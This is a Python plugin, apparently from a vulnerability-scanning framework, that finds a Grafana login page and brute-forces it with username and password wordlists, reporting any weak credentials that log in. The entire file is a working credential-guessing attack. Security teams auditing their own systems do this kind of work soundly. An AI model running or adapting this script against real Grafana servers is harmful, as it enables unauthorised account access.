#!/usr/bin/env python3

'''
name: Grafana弱口令漏洞
description: Grafana弱口令漏洞
'''

from app.lib.utils.request import request


class Grafana_Weakpwd_BaseVerify:
    def __init__(self, url):
       self.url = url
       self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
       }

    def check_url(self, url):
        try:
            req = request.get(url, headers = self.headers)
            if "Grafana" in req.text and req.status_code == 200:
                return url
            else:
                return False
        except Exception as e:
            return False
        finally:
            pass

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        valid_url = ""
        urls = []
        urls.append(self.url + '/grafana/login')
        urls.append(self.url + '/login')
        for url in urls:
            if self.check_url(url):
                valid_url = url
                break
        if valid_url == "":
            print('不存在Grafana弱口令')
            return False
        for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
            user = user.strip()
            for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                if pwd != '':
                    pwd = pwd.strip()
                post_data = r'{"user":"%s","email":"","password":"%s"}'%(user, pwd)
                try:
                    self.headers['Content-Type'] = 'application/json;charset=UTF-8'
                    req = request.post(valid_url, headers = self.headers, data = post_data)
                    if req.status_code == 200 and "Logged in" in req.text:
                        print("存在Grafana弱口令, user: %s pwd: %s"%(user, pwd))
                        return True
                except Exception as e:
                    print(e)
                finally:
                    pass
        print('不存在Grafana弱口令')
        return False

if __name__ == '__main__':
    Grafana_Weakpwd = Grafana_Weakpwd_BaseVerify('http://127.0.0.1:3000')
    Grafana_Weakpwd.run()